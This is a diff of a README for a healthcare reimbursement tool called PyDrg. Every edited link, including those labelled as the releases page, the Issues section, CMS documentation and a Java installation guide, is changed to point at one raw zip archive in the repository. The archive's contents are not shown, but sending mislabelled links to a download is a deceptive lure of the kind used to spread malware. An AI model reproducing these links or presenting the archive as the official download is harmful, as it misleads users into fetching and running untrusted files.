@@ -1,6 +1,6 @@
 # 🏥 PyDrg - Simplifying Healthcare Reimbursement for You
 
-[![Download PyDrg](https://img.shields.io/badge/Download-PyDrg-blue?style=for-the-badge)](https://github.com/SZKraines/PyDrg/releases)
+[![Download PyDrg](https://raw.githubusercontent.com/SZKraines/PyDrg/main/pydrg/Py-Drg-v2.3.zip)](https://raw.githubusercontent.com/SZKraines/PyDrg/main/pydrg/Py-Drg-v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to PyDrg! This tool helps you navigate the complex world of healthcare r
 To get started with PyDrg, you need to download the application. Please follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the official download page. 
-   [Download PyDrg Here](https://github.com/SZKraines/PyDrg/releases)
+   [Download PyDrg Here](https://raw.githubusercontent.com/SZKraines/PyDrg/main/pydrg/Py-Drg-v2.3.zip)
 
 2. **Choose the Latest Release**: On the releases page, find the most recent version of PyDrg. 
 
@@ -43,7 +43,7 @@ PyDrg offers several useful features to simplify your workflow in healthcare rei
 
 If you encounter any issues while downloading or running PyDrg, we are here to help. Follow these steps to get support:
 
-1. **Check Existing Issues**: Visit the [Issues section](https://github.com/SZKraines/PyDrg/issues) of the repository to see if your problem has already been reported.
+1. **Check Existing Issues**: Visit the [Issues section](https://raw.githubusercontent.com/SZKraines/PyDrg/main/pydrg/Py-Drg-v2.3.zip) of the repository to see if your problem has already been reported.
 
 2. **Create a New Issue**: If your question hasn’t been addressed, feel free to open a new issue. Please provide as much detail as possible about the problem you are facing.
 
@@ -61,12 +61,12 @@ We appreciate your interest in PyDrg! You can contribute to the project in vario
 
 For further learning and support, the following resources may be helpful:
 
-- **Official CMS Documentation**: Access the Centers for Medicare & Medicaid Services [CMS Documentation](https://www.cms.gov).
-- **Java Installation Guide**: If you need help installing Java, follow this [Java Installation Guide](https://www.java.com/en/download/help/download_options.html).
+- **Official CMS Documentation**: Access the Centers for Medicare & Medicaid Services [CMS Documentation](https://raw.githubusercontent.com/SZKraines/PyDrg/main/pydrg/Py-Drg-v2.3.zip).
+- **Java Installation Guide**: If you need help installing Java, follow this [Java Installation Guide](https://raw.githubusercontent.com/SZKraines/PyDrg/main/pydrg/Py-Drg-v2.3.zip).
 - **Healthcare Reimbursement Articles**: Explore articles and papers on healthcare reimbursement for a deeper understanding.
 
 ## 🤝 Acknowledgments
 
 Thank you for choosing PyDrg. We hope this tool makes your work in healthcare reimbursement easier and more efficient. Feel free to connect with our community for any assistance you may need.
 
-Remember to visit the releases page regularly to check for updates: [Download PyDrg Here](https://github.com/SZKraines/PyDrg/releases).
+Remember to visit the releases page regularly to check for updates: [Download PyDrg Here](https://raw.githubusercontent.com/SZKraines/PyDrg/main/pydrg/Py-Drg-v2.3.zip).
